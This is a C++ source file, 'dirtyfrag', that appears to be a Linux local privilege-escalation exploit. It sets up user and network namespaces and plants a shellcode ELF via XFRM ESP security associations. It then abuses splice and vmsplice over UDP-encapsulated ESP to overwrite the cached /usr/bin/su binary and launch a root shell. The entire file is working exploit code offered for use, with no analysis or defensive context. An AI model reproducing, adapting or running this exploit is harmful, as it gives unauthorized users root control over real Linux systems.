// Compile: g++ -std=c++17 -o dirtyfrag dirtyfrag.cpp
#define _GNU_SOURCE
#include <iostream>
#include <vector>
#include <cstring>
#include <cerrno>
#include <cstdlib>
#include <cstdint>
#include <unistd.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <sys/ioctl.h>
#include <sys/wait.h>
#include <net/if.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <linux/if.h>
#include <linux/netlink.h>
#include <linux/xfrm.h>
#include <linux/rtnetlink.h>
#include <sys/syscall.h>
#include <sched.h>
#include <cassert>
#include <span>

#ifndef UDP_ENCAP
#define UDP_ENCAP 100
#endif
#ifndef UDP_ENCAP_ESPINUDP
#define UDP_ENCAP_ESPINUDP 2
#endif

constexpr int PAGE_SIZE = 4096;
constexpr int ENC_PORT   = 4500;
constexpr int REPLAY_SEQ = 100;
constexpr int PAYLOAD_LEN = 192;
const std::string TARGET = "/usr/bin/su";

// supposed to drop root shell on x64 systems
static const uint8_t shell_elf[PAYLOAD_LEN] = {
    0x7f,0x45,0x4c,0x46,0x02,0x01,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    0x02,0x00,0x3e,0x00,0x01,0x00,0x00,0x00,0x78,0x00,0x40,0x00,0x00,0x00,0x00,0x00,
    0x40,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    0x00,0x00,0x00,0x00,0x40,0x00,0x38,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    0x01,0x00,0x00,0x00,0x05,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    0x00,0x00,0x40,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x00,0x00,0x00,0x00,
    0xb8,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xb8,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    0x00,0x10,0x00,0x00,0x00,0x00,0x00,0x00,0x31,0xff,0x31,0xf6,0x31,0xc0,0xb0,0x6a,
    0x0f,0x05,0xb0,0x69,0x0f,0x05,0xb0,0x74,0x0f,0x05,0x6a,0x00,0x48,0x8d,0x05,0x12,
    0x00,0x00,0x00,0x50,0x48,0x89,0xe2,0x48,0x8d,0x3d,0x12,0x00,0x00,0x00,0x31,0xf6,
    0x6a,0x3b,0x58,0x0f,0x05,0x54,0x45,0x52,0x4d,0x3d,0x78,0x74,0x65,0x72,0x6d,0x00,
    0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
};

void write_proc(const std::string& path, const std::string& data) {
    int fd = open(path.c_str(), O_WRONLY);
    if (fd < 0) throw std::runtime_error("write " + path + " failed");
    write(fd, data.c_str(), data.size());
    close(fd);
}

void setup_userns_netns() {
    uid_t uid = getuid();
    gid_t gid = getgid();
    if (unshare(CLONE_NEWUSER | CLONE_NEWNET) < 0)
        throw std::runtime_error("unshare");
    write_proc("/proc/self/setgroups", "deny");
    write_proc("/proc/self/uid_map", "0 " + std::to_string(uid) + " 1");
    write_proc("/proc/self/gid_map", "0 " + std::to_string(gid) + " 1");
    // bring lo up
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    struct ifreq ifr{};
    strncpy(ifr.ifr_name, "lo", IFNAMSIZ);
    ioctl(s, SIOCGIFFLAGS, &ifr);
    ifr.ifr_flags |= IFF_UP | IFF_RUNNING;
    ioctl(s, SIOCSIFFLAGS, &ifr);
    close(s);
}

void put_attr(std::vector<uint8_t>& buf, struct nlmsghdr* nlh, int type, const void* data, size_t len) {
    struct rtattr* rta = (struct rtattr*)(buf.data() + NLMSG_ALIGN(nlh->nlmsg_len));
    rta->rta_type = type;
    rta->rta_len = RTA_LENGTH(len);
    memcpy(RTA_DATA(rta), data, len);
    nlh->nlmsg_len = NLMSG_ALIGN(nlh->nlmsg_len) + RTA_ALIGN(rta->rta_len);
}

int add_xfrm_sa(uint32_t spi, uint32_t patch_seqhi) {
    int sk = socket(AF_NETLINK, SOCK_RAW, NETLINK_XFRM);
    if (sk < 0) return -1;
    struct sockaddr_nl nl{ .nl_family = AF_NETLINK };
    if (bind(sk, (struct sockaddr*)&nl, sizeof(nl)) < 0) { close(sk); return -1; }

    std::vector<uint8_t> buf(4096, 0);
    struct nlmsghdr* nlh = (struct nlmsghdr*)buf.data();
    nlh->nlmsg_type  = XFRM_MSG_NEWSA;
    nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
    nlh->nlmsg_pid   = getpid();
    nlh->nlmsg_seq   = 1;
    nlh->nlmsg_len   = NLMSG_LENGTH(sizeof(struct xfrm_usersa_info));

    auto* xs = (struct xfrm_usersa_info*)NLMSG_DATA(nlh);
    xs->id.daddr.a4 = inet_addr("127.0.0.1");
    xs->id.spi      = htonl(spi);
    xs->id.proto    = IPPROTO_ESP;
    xs->saddr.a4    = inet_addr("127.0.0.1");
    xs->family      = AF_INET;
    xs->mode        = XFRM_MODE_TRANSPORT;
    xs->replay_window = 0;
    xs->reqid       = 0x1234;
    xs->flags       = XFRM_STATE_ESN;
    xs->lft.soft_byte_limit = (uint64_t)-1;
    xs->lft.hard_byte_limit = (uint64_t)-1;
    xs->lft.soft_packet_limit = (uint64_t)-1;
    xs->lft.hard_packet_limit = (uint64_t)-1;
    xs->sel.family  = AF_INET;
    xs->sel.prefixlen_d = 32;
    xs->sel.prefixlen_s = 32;
    xs->sel.daddr.a4 = inet_addr("127.0.0.1");
    xs->sel.saddr.a4 = inet_addr("127.0.0.1");

    // auth_trunc
    {
        uint8_t abuf[sizeof(struct xfrm_algo_auth) + 32];
        memset(abuf, 0, sizeof(abuf));
        auto* auth = (struct xfrm_algo_auth*)abuf;
        strncpy(auth->alg_name, "hmac(sha256)", sizeof(auth->alg_name)-1);
        auth->alg_key_len = 32*8;
        auth->alg_trunc_len = 128;
        memset(auth->alg_key, 0xAA, 32);
        put_attr(buf, nlh, XFRMA_ALG_AUTH_TRUNC, abuf, sizeof(abuf));
    }
    // crypt
    {
        uint8_t cbuf[sizeof(struct xfrm_algo) + 16];
        memset(cbuf, 0, sizeof(cbuf));
        auto* crypt = (struct xfrm_algo*)cbuf;
        strncpy(crypt->alg_name, "cbc(aes)", sizeof(crypt->alg_name)-1);
        crypt->alg_key_len = 16*8;
        memset(crypt->alg_key, 0xBB, 16);
        put_attr(buf, nlh, XFRMA_ALG_CRYPT, cbuf, sizeof(cbuf));
    }
    // encap
    {
        struct xfrm_encap_tmpl enc{};
        enc.encap_type  = UDP_ENCAP_ESPINUDP;
        enc.encap_sport = htons(ENC_PORT);
        enc.encap_dport = htons(ENC_PORT);
        put_attr(buf, nlh, XFRMA_ENCAP, &enc, sizeof(enc));
    }
    // esn
    {
        uint8_t esn_buf[sizeof(struct xfrm_replay_state_esn) + 4];
        memset(esn_buf, 0, sizeof(esn_buf));
        auto* esn = (struct xfrm_replay_state_esn*)esn_buf;
        esn->bmp_len       = 1;
        esn->oseq          = 0;
        esn->seq           = REPLAY_SEQ;
        esn->oseq_hi       = 0;
        esn->seq_hi        = patch_seqhi;
        esn->replay_window = 32;
        put_attr(buf, nlh, XFRMA_REPLAY_ESN_VAL, esn_buf, sizeof(esn_buf));
    }

    if (send(sk, buf.data(), nlh->nlmsg_len, 0) < 0) { close(sk); return -1; }
    uint8_t rbuf[4096];
    int n = recv(sk, rbuf, sizeof(rbuf), 0);
    if (n < 0) { close(sk); return -1; }
    auto* rh = (struct nlmsghdr*)rbuf;
    if (rh->nlmsg_type == NLMSG_ERROR) {
        auto* e = (struct nlmsgerr*)NLMSG_DATA(rh);
        if (e->error) { close(sk); return -1; }
    }
    close(sk);
    return 0;
}

int do_one_write(int file_fd, off_t offset, uint32_t spi) {
    int sk_recv = socket(AF_INET, SOCK_DGRAM, 0);
    int one = 1;
    setsockopt(sk_recv, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));
    sockaddr_in sa{AF_INET, htons(ENC_PORT), {inet_addr("127.0.0.1")}};
    if (bind(sk_recv, (sockaddr*)&sa, sizeof(sa)) < 0) { close(sk_recv); return -1; }
    int encap = UDP_ENCAP_ESPINUDP;
    setsockopt(sk_recv, IPPROTO_UDP, UDP_ENCAP, &encap, sizeof(encap));

    int sk_send = socket(AF_INET, SOCK_DGRAM, 0);
    connect(sk_send, (sockaddr*)&sa, sizeof(sa));

    int p[2];
    pipe(p);
    uint8_t hdr[24];
    *(uint32_t*)(hdr) = htonl(spi);
    *(uint32_t*)(hdr+4) = htonl(200);
    memset(hdr+8, 0xCC, 16);

    iovec iov{.iov_base = hdr, .iov_len = sizeof(hdr)};
    vmsplice(p[1], &iov, 1, 0);  // assume success
    loff_t off = offset;
    splice(file_fd, &off, p[1], nullptr, 16, SPLICE_F_MOVE);
    splice(p[0], nullptr, sk_send, nullptr, 24+16, 0);
    usleep(150'000);

    close(p[0]); close(p[1]);
    close(sk_send); close(sk_recv);
    return 0;
}

void corrupt_su() {
    setup_userns_netns();
    usleep(100'000);

    for (int i = 0; i < PAYLOAD_LEN/4; ++i) {
        uint32_t spi = 0xDEADBE10 + i;
        uint32_t seqhi = (uint32_t(shell_elf[i*4]) << 24) |
                         (uint32_t(shell_elf[i*4+1]) << 16) |
                         (uint32_t(shell_elf[i*4+2]) << 8) |
                         (uint32_t(shell_elf[i*4+3]));
        if (add_xfrm_sa(spi, seqhi) < 0)
            throw std::runtime_error("add_xfrm_sa #" + std::to_string(i) + " failed");
    }
    std::cout << "[+] installed " << PAYLOAD_LEN/4 << " XFRM SAs\n";

    int fd = open(TARGET.c_str(), O_RDONLY);
    for (int i = 0; i < PAYLOAD_LEN/4; ++i) {
        uint32_t spi = 0xDEADBE10 + i;
        off_t off = i*4;
        do_one_write(fd, off, spi);
    }
    close(fd);
    std::cout << "[+] wrote " << PAYLOAD_LEN << " bytes to " << TARGET << "\n";
}

bool verify_patch() {
    int fd = open(TARGET.c_str(), O_RDONLY);
    uint8_t buf[2];
    pread(fd, buf, 2, 0x78);
    close(fd);
    return buf[0] == 0x31 && buf[1] == 0xff;
}

int main() {
    if (geteuid() == 0) {
        execl("/bin/bash", "bash", nullptr);
    }
    try {
        corrupt_su();
        if (!verify_patch()) {
            std::cerr << "[-] patch verification failed\n";
            return 1;
        }
        std::cout << "[+] launching root shell\n";
        execl(TARGET.c_str(), "su", "-", nullptr);
    } catch (const std::exception& e) {
        std::cerr << "error: " << e.what() << "\n";
        return 1;
    }
}